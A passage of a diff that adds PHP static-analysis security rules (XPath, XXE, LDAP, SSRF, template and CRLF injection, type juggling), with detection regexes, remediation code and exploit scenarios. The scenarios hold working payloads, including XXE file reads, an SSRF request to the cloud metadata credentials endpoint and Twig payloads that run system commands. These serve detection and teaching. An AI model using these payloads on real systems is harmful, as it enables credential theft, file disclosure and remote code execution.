+    - ->load\s*\(
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - $_COOKIE
+    - $request->input(
+    - $request->get(
+    - file_get_contents("php://input")
+    - $_SERVER["HTTP_
+    taint_sink_indicators:
+    - ->query(
+    - ->evaluate(
+    - ->xpath(
+    - DOMXPath::query
+    - DOMXPath::evaluate
+    - SimpleXMLElement::xpath
+    - simplexml_load_file()->xpath
+    sanitization_patterns:
+    - addslashes(
+    - htmlspecialchars(
+    - str_replace("'",
+    - preg_replace(
+    - preg_match(
+    - ctype_alnum(
+    - is_numeric(
+    - in_array(
+    - xpath_quote(
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_presence) * exploitability_score
+    exploitability_score: 0.75
+    impact_subscore: 7.5
+    data_classification_risk: high
+  exploit_scenario:
+    attack_example: 'An application authenticates users against an XML file: $xpath->query("//user[username/text()=''" . $_POST[''user''] . "'' and password/text()=''" . $_POST[''pass''] . "'']"). An attacker
+      submits user='' or ''1''=''1&pass='' or ''1''=''1 producing the XPath query: //user[username/text()='''' or ''1''=''1'' and password/text()='''' or ''1''=''1''] which matches all users and bypasses
+      authentication. The attacker logs in as the first user in the XML store.
+
+      '
+    example_payload: ''' or ''1''=''1'
+    attacker_objective: 'Bypass XML-based authentication, extract sensitive data from XML documents (credentials, configuration, personal information), and enumerate the entire XML document structure through
+      boolean-based or error-based XPath injection techniques.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.82
+    context_match: 0.85
+    proximity_to_user_input: 0.9
+    sanitization_absence: 0.88
+    historical_accuracy: 0.8
+  impact: 'XPath injection allows authentication bypass, unauthorized data extraction,
+
+    and information disclosure from XML data stores. Complete XML document
+
+    enumeration is possible through boolean-based blind XPath injection.
+
+    Unlike SQL injection, XPath has no access control so the entire
+
+    document is always accessible once injection is achieved.
+
+    '
+  remediation: "- Use parameterized XPath queries where supported\n- Escape special XPath characters (' \" / \\ etc.)\n- Validate input against strict character allowlists\n- Use DOMXPath::registerPhpFunctions\
+    \ with caution\n- Implement a custom xpath_quote() function for proper escaping\n\nCustom XPath escaping function:\n  function xpath_quote(string $value): string {\n      if (strpos($value, \"'\") ===\
+    \ false) {\n          return \"'\" . $value . \"'\";\n      }\n      if (strpos($value, '\"') === false) {\n          return '\"' . $value . '\"';\n      }\n      return \"concat('\" . str_replace(\"\
+    '\", \"',\\\"'\\\",'\", $value) . \"')\";\n  }\n\nFramework-specific fixes:\n\nLaravel:\n  // Validate input strictly before XPath use\n  $validated = $request->validate([\n      'username' => 'required|alpha_num|max:50',\n\
+    \      'search'   => 'required|regex:/^[a-zA-Z0-9\\s]+$/',\n  ]);\n  // Use Eloquent/database instead of XML data stores when possible\n\nSymfony:\n  // Use DomCrawler component with proper filtering\n\
+    \  use Symfony\\Component\\DomCrawler\\Crawler;\n  $crawler = new Crawler($xml);\n  $results = $crawler->filterXPath('//user[username[text()=' .\n      xpath_quote($validatedUsername) . ']]');\n  //\
+    \ Prefer database storage over XML for user data\n\nWordPress:\n  // Sanitize before XML operations\n  $safe_input = sanitize_text_field($input);\n  if (!preg_match('/^[a-zA-Z0-9_]+$/', $safe_input))\
+    \ { wp_die('Invalid input'); }\n  // Use WP database APIs (wpdb) instead of XML when possible\n\nCodeIgniter:\n  // Validate input format\n  $this->form_validation->set_rules('search', 'Search', 'required|alpha_numeric');\n\
+    \  // Use database queries instead of XPath when possible\n  // If XPath is required, always escape with xpath_quote()\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/643.html
+  - https://owasp.org/Top10/A03_2021-Injection/
+  - https://owasp.org/www-community/attacks/XPATH_Injection
+  - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+    false_positive_rate: low
+    created: '2024-01-01'
+    author: security-rules-team
+  cross_rule_intelligence:
+    cross_file_risk_flag: false
+    requires_ai_validation: true
+    high_impact_flag: false
+    related_rules:
+    - PHP-INJ-001
+    - PHP-INJ-003
+    escalation_chain: XPath injection is typically a standalone vulnerability but may chain with code injection (PHP-INJ-003) if extracted XML data is later passed to eval or dynamic function calls. XML
+      data stores that contain credentials could enable further authentication-based attacks.
+    combined_risk_multiplier: 1.2
+  detection_layer: 1
+- rule_id: PHP-INJ-006
+  title: XML External Entity (XXE) Injection
+  description: 'Detects XXE vulnerabilities where XML parsers (simplexml_load_string, DOMDocument::loadXML, xml_parse) process user-controlled XML without disabling external entity loading. PHP''s libxml
+    is vulnerable by default in versions prior to PHP 8.0. Covers simplexml, DOM, XMLReader, and XMLParser extensions.
+
+    '
+  language: php
+  category: injection
+  severity: High
+  confidence: 0.9
+  cwe: CWE-611
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - xxe
+  - xml-injection
+  - file-disclosure
+  - ssrf
+  - php
+  - libxml
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: simplexml_load_string\s*\(\s*\$(?:_(?:GET|POST|REQUEST|FILES)|input|data|body|xml|content|payload)\b
+    description: simplexml_load_string with user-controlled XML string
+  - type: regex
+    pattern: \$\w+->loadXML\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|input|data|body|xml|content)\b
+    description: DOMDocument::loadXML with user-controlled XML
+  - type: regex
+    pattern: simplexml_load_file\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|input|file|path|url)\b
+    description: simplexml_load_file with user-controlled file path
+  - type: regex
+    pattern: xml_parse\s*\(\s*\$\w+\s*,\s*\$(?:_(?:GET|POST|REQUEST)|input|data|body|xml)\b
+    description: xml_parse with user-controlled XML data
+  - type: regex
+    pattern: \$\w+->load\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|input|file|path|url)\b
+    description: DOMDocument::load with user-controlled file
+  - type: regex
+    pattern: new\s+XMLReader\s*\(\s*\)[^;]*open\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|input|file|path)\b
+    description: XMLReader::open with user-controlled source
+  anti_patterns:
+  - libxml_disable_entity_loader(true)
+  - LIBXML_NOENT
+  - LIBXML_NONET
+  - LIBXML_DTDLOAD
+  - json_decode
+  - htmlspecialchars
+  - strip_tags
+  bypass_variants:
+  - description: DTD-based entity expansion
+    pattern: <!DOCTYPE.*<!ENTITY
+  - description: Parameter entity for out-of-band exfiltration
+    pattern: <!ENTITY\s+%\s+\w+\s+SYSTEM
+  evasion_indicators:
+  - External entity via DTD
+  - Parameter entities for OOB
+  - PHP stream wrappers
+  encoding_variants:
+  - type: utf16
+    pattern: \\xff\\xfe.*DOCTYPE
+  - type: php_stream
+    pattern: php://filter.*convert
+  multi_function_chain_patterns:
+  - file_get_contents('php://input') -> simplexml_load_string($xml)
+  - $_POST['xml'] -> new DOMDocument() -> loadXML($xml)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: File disclosure via file:// and SSRF via http:// entities
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: php://input, $_POST, $_FILES
+    sink: simplexml_load_string(), DOMDocument::loadXML()
+    through: Direct XML parsing of request body
+  impact: 'XXE enables reading local files (e.g., /etc/passwd, wp-config.php),
+
+    SSRF to internal services, and DoS via entity expansion. PHP stream
+
+    wrappers (php://filter) allow base64-encoded file exfiltration.
+
+    '
+  remediation: "Disable external entity loading before parsing XML:\n\n  // PHP < 8.0: Disable entities explicitly\n  libxml_disable_entity_loader(true);\n  $dom = new DOMDocument();\n  $dom->loadXML($xml,\
+    \ LIBXML_NONET | LIBXML_NOENT);\n\n  // PHP 8.0+: External entities disabled by default\n  $xml = simplexml_load_string($data);\n\n  // Prefer JSON over XML for API input\n  $data = json_decode(file_get_contents('php://input'),\
+    \ true);\n\nLaravel: Use JSON APIs. If XML is required, validate with\nlibxml_disable_entity_loader(true) in middleware.\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/611.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - simplexml_load_string
+    - DOMDocument
+    - XMLReader
+    - xml_parse
+    taint_source_indicators:
+    - php://input
+    - $_POST
+    - $_GET
+    - $_REQUEST
+    - $_FILES
+    taint_sink_indicators:
+    - simplexml_load_string(
+    - loadXML(
+    - xml_parse(
+    - simplexml_load_file(
+    sanitization_patterns:
+    - libxml_disable_entity_loader(true)
+    - LIBXML_NONET
+    - LIBXML_NOENT
+    - json_decode
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * php_version_risk
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'API accepts XML uploads via simplexml_load_string(file_get_contents(''php://input'')).
+
+      Attacker sends: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><data>&xxe;</data>
+
+      '
+    example_payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=../config/database.php">]><root>&xxe;</root>
+    attacker_objective: Read local files and PHP source code via XXE with PHP stream wrappers
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PHP-INJ-001
+    - PHP-INJ-004
+- rule_id: PHP-INJ-008
+  title: LDAP Injection via Unsanitized Filter
+  description: 'Detects LDAP filter construction with user-controlled input without proper escaping via ldap_escape(). Covers ldap_search, ldap_list, ldap_read, and custom filter string construction in
+    PHP applications using Active Directory or OpenLDAP.
+
+    '
+  language: php
+  category: injection
+  severity: High
+  confidence: 0.87
+  cwe: CWE-90
+  owasp: A03:2021-Injection
+  tags:
+  - ldap-injection
+  - directory-service
+  - authentication-bypass
+  - php
+  detection_layer: 2
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: ldap_search\s*\(\s*\$\w+\s*,\s*\$\w+\s*,\s*[^,)]*\$(?:_(?:GET|POST|REQUEST)|input|user|username|search)\b
+    description: ldap_search with user-controlled filter
+  - type: regex
+    pattern: ldap_search\s*\(\s*\$\w+\s*,\s*\$\w+\s*,\s*["'].*["']?\s*\.\s*\$(?:_(?:GET|POST|REQUEST)|input|user|username)\b
+    description: ldap_search with concatenated user input in filter
+  - type: regex
+    pattern: (?:filter|ldapFilter)\s*=\s*["']?\s*\(?(?:uid|cn|sAMAccountName|mail)=\s*["']?\s*\.\s*\$(?:_(?:GET|POST|REQUEST)|input|user)\b
+    description: LDAP filter built with concatenated user input
+  - type: regex
+    pattern: sprintf\s*\(\s*["']?\((?:uid|cn|sAMAccountName|mail)=%s\)["']?\s*,\s*\$(?:_(?:GET|POST|REQUEST)|input|user|username)\b
+    description: LDAP filter via sprintf with user input
+  - type: regex
+    pattern: ldap_(?:list|read)\s*\(\s*\$\w+\s*,\s*[^,]*\$(?:_(?:GET|POST|REQUEST)|input|user)\b
+    description: ldap_list/ldap_read with user-controlled parameters
+  anti_patterns:
+  - ldap_escape(
+  - LDAP_ESCAPE_FILTER
+  - LDAP_ESCAPE_DN
+  - preg_match.*alphanumeric
+  - ctype_alnum
+  - filter_var
+  - allowlist
+  bypass_variants:
+  - description: Wildcard injection
+    pattern: \\*
+  - description: Filter logic manipulation
+    pattern: \\)\\(|\\|\\(
+  evasion_indicators:
+  - Wildcard injection
+  - Filter parenthesis manipulation
+  - NULL byte injection
+  encoding_variants:
+  - type: url_encoding
+    pattern: '%28|%29|%2a'
+  multi_function_chain_patterns:
+  - $_POST['username'] -> sprintf('(uid=%s)', $username) -> ldap_search()
+  - $request->input('user') -> ldap_search($conn, $baseDN, '(cn=' . $user . ')')
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Authentication bypass and directory enumeration
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: $_POST, $request->input()
+    sink: ldap_search(), ldap_list()
+    through: Filter string construction with sprintf or concatenation
+  impact: 'LDAP injection enables authentication bypass, user/group enumeration,
+
+    extraction of sensitive directory attributes, and potential privilege
+
+    escalation via group membership manipulation.
+
+    '
+  remediation: "Use ldap_escape() to sanitize user input in LDAP filters:\n\n  // SAFE: PHP 5.6+ ldap_escape\n  $filter = sprintf('(uid=%s)', ldap_escape($username, '', LDAP_ESCAPE_FILTER));\n  ldap_search($conn,\
+    \ $baseDN, $filter);\n\n  // SAFE: Input validation\n  if (!preg_match('/^[a-zA-Z0-9._-]+$/', $username)) {\n      throw new InvalidArgumentException('Invalid username');\n  }\n\nLaravel: Validate input\
+    \ with alpha_dash rule before LDAP queries.\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/90.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - ldap_connect(
+    - ldap_bind(
+    - ldap_search(
+    - ldap_list(
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - $request->input(
+    taint_sink_indicators:
+    - ldap_search(
+    - ldap_list(
+    - ldap_read(
+    sanitization_patterns:
+    - ldap_escape(
+    - LDAP_ESCAPE_FILTER
+    - ctype_alnum(
+    - preg_match
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * auth_context_risk
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'Login page checks credentials via ldap_search($conn, $dn, "(uid=$user)").
+
+      Attacker submits user=admin)(|(uid=* to bypass authentication.
+
+      '
+    example_payload: admin)(|(uid=*)
+    attacker_objective: Bypass authentication via LDAP filter manipulation
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PHP-INJ-001
+    - PHP-INJ-003
+- rule_id: PHP-INJ-009
+  title: Server-Side Request Forgery (SSRF) via curl/file_get_contents
+  description: 'Detects SSRF where user-controlled URLs are passed to curl_exec, file_get_contents, or Guzzle HTTP client, enabling access to internal services, cloud metadata endpoints, and port scanning.
+
+    '
+  language: php
+  category: injection
+  severity: High
+  confidence: 0.89
+  cwe: CWE-918
+  owasp: A10:2021-Server-Side-Request-Forgery
+  tags:
+  - ssrf
+  - url-injection
+  - internal-access
+  - php
+  - curl
+  detection_layer: 2
+  attack_surface_type: api
+  patterns:
+  - type: regex
+    pattern: file_get_contents\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|url|target|endpoint|input|param)\b
+    description: file_get_contents with user-controlled URL
+  - type: regex
+    pattern: curl_setopt\s*\(\s*\$\w+\s*,\s*CURLOPT_URL\s*,\s*\$(?:_(?:GET|POST|REQUEST)|url|target|endpoint|input|param)\b
+    description: curl_setopt CURLOPT_URL with user-controlled URL
+  - type: regex
+    pattern: curl_init\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|url|target|endpoint|input|param)\b
+    description: curl_init with user-controlled URL
+  - type: regex
+    pattern: (?:new\s+)?(?:GuzzleHttp\\\\)?Client\s*\)\s*->(?:get|post|request)\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|url|target|input)\b
+    description: Guzzle HTTP client with user-controlled URL
+  - type: regex
+    pattern: fopen\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|url|target|input|param)\b\s*,\s*["']r
+    description: fopen with user-controlled URL for reading
+  anti_patterns:
+  - parse_url
+  - filter_var.*FILTER_VALIDATE_URL
+  - CURLOPT_PROTOCOLS
+  - allowedHosts
+  - isPrivateIP
+  - gethostbyname
+  - allowlist
+  bypass_variants:
+  - description: DNS rebinding
+    pattern: gethostbyname.*\$(?:url|host)
+  - description: Decimal IP encoding
+    pattern: 2130706433|0x7f000001
+  evasion_indicators:
+  - DNS rebinding
+  - Decimal/octal IP encoding
+  - URL parser differentials
+  encoding_variants:
+  - type: decimal_ip
+    pattern: '2130706433'
+  - type: url_encoding
+    pattern: '%31%36%39%2e%32%35%34'
+  multi_function_chain_patterns:
+  - $_GET['url'] -> file_get_contents($url)
+  - $request->input('target') -> curl_init($target) -> curl_exec()
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Access internal services and cloud metadata (169.254.169.254)
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: $_GET, $_POST, $request->input()
+    sink: file_get_contents(), curl_exec(), Guzzle->get()
+    through: Direct URL from user input
+  impact: 'SSRF enables access to internal services, cloud metadata endpoints
+
+    (AWS/GCP/Azure), port scanning of internal networks, and credential
+
+    theft from cloud IAM roles.
+
+    '
+  remediation: "Validate URLs against an allowlist. Block private IP ranges:\n\n  // SAFE: Validate URL and block internal IPs\n  $url = filter_var($input, FILTER_VALIDATE_URL);\n  $host = parse_url($url,\
+    \ PHP_URL_HOST);\n  $ip = gethostbyname($host);\n  if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {\n      throw new Exception('Access to internal\
+    \ IPs blocked');\n  }\n\n  // SAFE: Restrict curl protocols\n  curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);\n\nLaravel: Use Http::withOptions(['protocols' => CURLPROTO_HTTPS]).\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/918.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - curl_init(
+    - file_get_contents(
+    - GuzzleHttp
+    - fopen(
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - $request->input(
+    taint_sink_indicators:
+    - file_get_contents(
+    - curl_exec(
+    - curl_init(
+    - fopen(
+    sanitization_patterns:
+    - parse_url(
+    - FILTER_VALIDATE_URL
+    - CURLOPT_PROTOCOLS
+    - allowedHosts
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - url_validation_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'Proxy endpoint fetches URLs: file_get_contents($_GET[''url'']).
+
+      Attacker sends url=http://169.254.169.254/latest/meta-data/iam/security-credentials/.
+
+      '
+    example_payload: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+    attacker_objective: Access cloud metadata to steal IAM credentials
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PHP-INJ-004
+    - PHP-INJ-006
+- rule_id: PHP-INJ-010
+  title: Server-Side Template Injection via Twig/Smarty/Blade
+  description: 'Detects SSTI where user-controlled input is passed to template engines (Twig, Smarty, Blade) as template source rather than template data. Enables arbitrary code execution through template
+    engine features.
+
+    '
+  language: php
+  category: injection
+  severity: High
+  confidence: 0.88
+  cwe: CWE-1336
+  owasp: A03:2021-Injection
+  tags:
+  - ssti
+  - template-injection
+  - twig
+  - smarty
+  - blade
+  - php
+  - rce
+  detection_layer: 2
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: (?:Twig\\\\)?Environment\s*\)\s*->(?:createTemplate|render)\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|input|data|body|template|content)\b
+    description: Twig createTemplate/render with user-controlled template
+  - type: regex
+    pattern: twig->render\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|input|template|content)\b
+    description: Twig render with user template string
+  - type: regex
+    pattern: \$(?:smarty|tpl)->(?:fetch|display)\s*\(\s*["']string:\s*["']?\s*\.\s*\$(?:_(?:GET|POST|REQUEST)|input|template|content)\b
+    description: Smarty fetch/display with user-controlled string template
+  - type: regex
+    pattern: Blade::render\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|input|template|content)\b
+    description: Laravel Blade::render with user-controlled template
+  - type: regex
+    pattern: eval\s*\(\s*["']?\s*\?>.*\$(?:_(?:GET|POST|REQUEST)|input|template)\b
+    description: PHP eval used as template engine with user input
+  - type: regex
+    pattern: (?:Twig\\\\)?Loader\w*\s*\(\s*\$(?:_(?:GET|POST|REQUEST)|input|template|content)\b
+    description: Twig loader initialized with user-controlled source
+  anti_patterns:
+  - render.*view
+  - render.*template_name
+  - Twig\Loader\FilesystemLoader
+  - Twig\Loader\ArrayLoader
+  - htmlspecialchars
+  - e(
+  - Blade::render.*view
+  bypass_variants:
+  - description: Twig sandbox escape
+    pattern: \\{\\{.*_self.*env.*
+  - description: Smarty {php} tag
+    pattern: \\{php\\}
+  evasion_indicators:
+  - Twig sandbox escape via _self.env
+  - Smarty {php} tag
+  - Blade @php directive
+  encoding_variants:
+  - type: unicode
+    pattern: \\u007b\\u007b
+  multi_function_chain_patterns:
+  - $_POST['template'] -> $twig->createTemplate($template) -> render()
+  - $input -> Blade::render($input, $data)
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: RCE via template engine code execution features
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: $_POST, $request->input()
+    sink: Twig::createTemplate(), Blade::render(), Smarty::fetch()
+    through: User input as template source string
+  impact: 'SSTI enables arbitrary PHP code execution, file system access,
+
+    and complete server compromise through template engine features.
+
+    Twig: {{_self.env.registerUndefinedFilterCallback(''exec'')}}
+
+    Smarty: {php}system(''id''){/php}
+
+    '
+  remediation: "Never use user input as template source. Pass data as variables:\n\n  // UNSAFE: User input as template\n  echo $twig->createTemplate($_POST['content'])->render([]);\n\n  // SAFE: User input\
+    \ as data\n  echo $twig->render('page.html.twig', ['content' => $userInput]);\n\n  // SAFE: Twig sandbox mode for user content\n  $sandbox = new \\Twig\\Extension\\SandboxExtension($policy);\n  $twig->addExtension($sandbox);\n\
+    \nLaravel: Only use Blade::render with predefined view files.\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/1336.html
+  - https://portswigger.net/research/server-side-template-injection
+  context_awareness:
+    surrounding_context_patterns:
+    - Twig\\Environment
+    - Smarty
+    - Blade::render
+    - createTemplate
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - $request->input(
+    taint_sink_indicators:
+    - createTemplate(
+    - Blade::render(
+    - 'fetch("string:'
+    - 'display("string:'
+    sanitization_patterns:
+    - FilesystemLoader
+    - ArrayLoader
+    - SandboxExtension
+    - htmlspecialchars
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * sandbox_absence_factor
+    exploitability_score: Critical
+  exploit_scenario:
+    attack_example: 'CMS allows custom email templates via Twig: $twig->createTemplate($input)->render().
+
+      Attacker injects: {{_self.env.registerUndefinedFilterCallback(''system'')}}{{_self.env.getFilter(''id'')}}
+
+      '
+    example_payload: '{{[''id'']|filter(''system'')}}'
+    attacker_objective: Achieve RCE via Twig template injection
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: critical
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PHP-INJ-003
+    - PHP-INJ-001
+- rule_id: PHP-INJ-011
+  title: HTTP Header / CRLF Injection
+  description: 'Detects CRLF injection where user-controlled values are passed to header(), setcookie(), or framework response header methods without stripping newline characters. Enables HTTP response
+    splitting, session fixation, and XSS.
+
+    '
+  language: php
+  category: injection
+  severity: High
+  confidence: 0.87
+  cwe: CWE-113
+  owasp: A03:2021-Injection
+  tags:
+  - crlf-injection
+  - header-injection
+  - response-splitting
+  - php
+  detection_layer: 2
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: header\s*\(\s*["'](?:Location|Content-Type|Content-Disposition|Set-Cookie)["']?\s*\.\s*[^)]*\$(?:_(?:GET|POST|REQUEST)|input|param|url|redirect|file)\b
+    description: header() with user-controlled value via concatenation
+  - type: regex
+    pattern: header\s*\(\s*["']Location:\s*["']?\s*\.\s*\$(?:_(?:GET|POST|REQUEST)|url|redirect|next|return|target)\b
+    description: Location header redirect with user-controlled URL
+  - type: regex
+    pattern: header\s*\(\s*sprintf\s*\(\s*["'][^"]*%s[^"]*["'][^)]*\$(?:_(?:GET|POST|REQUEST)|input|param|user)\b
+    description: header() with sprintf-constructed value from user input
+  - type: regex
+    pattern: setcookie\s*\(\s*[^,]*,\s*\$(?:_(?:GET|POST|REQUEST)|input|param|value|user)\b
+    description: setcookie with user-controlled cookie value
+  - type: regex
+    pattern: ->header\s*\(\s*["'][^"]*["']\s*,\s*\$(?:_(?:GET|POST|REQUEST)|input|param|value)\b
+    description: Framework response header with user-controlled value
+  anti_patterns:
+  - str_replace.*\r
+  - str_replace.*\n
+  - preg_replace.*\r\n
+  - urlencode(
+  - rawurlencode(
+  - filter_var.*FILTER_SANITIZE_URL
+  bypass_variants:
+  - description: URL-encoded CRLF
+    pattern: '%0[dD]%0[aA]'
+  - description: Double-encoded CRLF
+    pattern: '%250[dD]%250[aA]'
+  evasion_indicators:
+  - URL-encoded CRLF
+  - Unicode newlines
+  - HTTP/2 header injection
+  encoding_variants:
+  - type: url_encoding
+    pattern: '%0[dD]%0[aA]'
+  - type: double_encoding
+    pattern: '%250[dD]%250[aA]'
+  multi_function_chain_patterns:
+  - '$_GET[''file''] -> header(''Content-Disposition: attachment; filename='' . $file)'
+  - '$_GET[''url''] -> header(''Location: '' . $url)'
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: Response splitting for XSS and session fixation
+  business_logic_indicator:
+    financial_impact: false
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: $_GET, $_POST, $_REQUEST
+    sink: header(), setcookie()
+    through: Direct value in header function
+  impact: 'CRLF injection enables HTTP response splitting, XSS injection via
+
+    injected response body, cache poisoning, and session fixation via
+
+    injected Set-Cookie headers.
+
+    '
+  remediation: "Strip CR/LF characters from header values:\n\n  // SAFE: Remove newlines\n  $value = str_replace([\"\\r\", \"\\n\", \"%0d\", \"%0a\"], '', $input);\n  header('Location: ' . $value);\n\n\
+    \  // SAFE: URL-encode redirect URLs\n  header('Location: ' . filter_var($url, FILTER_SANITIZE_URL));\n\n  // PHP 8.0+: header() rejects values with newlines by default\n\nLaravel: Use redirect()->to()\
+    \ which handles sanitization.\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/113.html
+  - https://owasp.org/www-community/attacks/HTTP_Response_Splitting
+  context_awareness:
+    surrounding_context_patterns:
+    - header(
+    - setcookie(
+    - ->header(
+    - ->withHeader(
+    taint_source_indicators:
+    - $_GET
+    - $_POST
+    - $_REQUEST
+    - $request->input(
+    taint_sink_indicators:
+    - header(
+    - setcookie(
+    - ->header(
+    - ->withHeader(
+    sanitization_patterns:
+    - str_replace.*\\r
+    - str_replace.*\\n
+    - urlencode(
+    - FILTER_SANITIZE_URL
+  severity_scoring:
+    severity_weight: 7
+    risk_score_formula_hint: severity_weight * confidence * php_version_factor
+    exploitability_score: Medium
+  exploit_scenario:
+    attack_example: 'Download endpoint: header(''Content-Disposition: attachment; filename='' . $_GET[''name'']).
+
+      Attacker sends name=file%0d%0aSet-Cookie:%20admin=true to inject cookie.
+
+      '
+    example_payload: 'file\r\nSet-Cookie: admin=true'
+    attacker_objective: Inject response headers for session fixation or XSS
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - PHP-INJ-001
+    - PHP-INJ-009
+- rule_id: PHP-INJ-012
+  title: PHP Type Juggling in Security Comparisons
+  description: 'Detects loose comparison (== instead of ===) of user input against security-sensitive values (passwords, tokens, hashes), enabling authentication bypass through PHP''s type coercion. Includes
+    strcmp() bypass and hash comparison vulnerabilities.
+
+    '
+  language: php
+  category: injection
+  severity: High
+  confidence: 0.85
+  cwe: CWE-843
+  owasp: A02:2021-Cryptographic-Failures
+  tags:
+  - type-juggling
+  - loose-comparison
+  - authentication-bypass
+  - php
+  detection_layer: 2
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: \$(?:_(?:GET|POST|REQUEST|COOKIE)|input|password|token|key|secret|hash|api_key)\b\s*==\s*(?:\$(?:stored|expected|hash|password|token|db|correct|valid)|[a-zA-Z_]\w{0,30}\()
+    description: Loose comparison of user input with security value
+  - type: regex
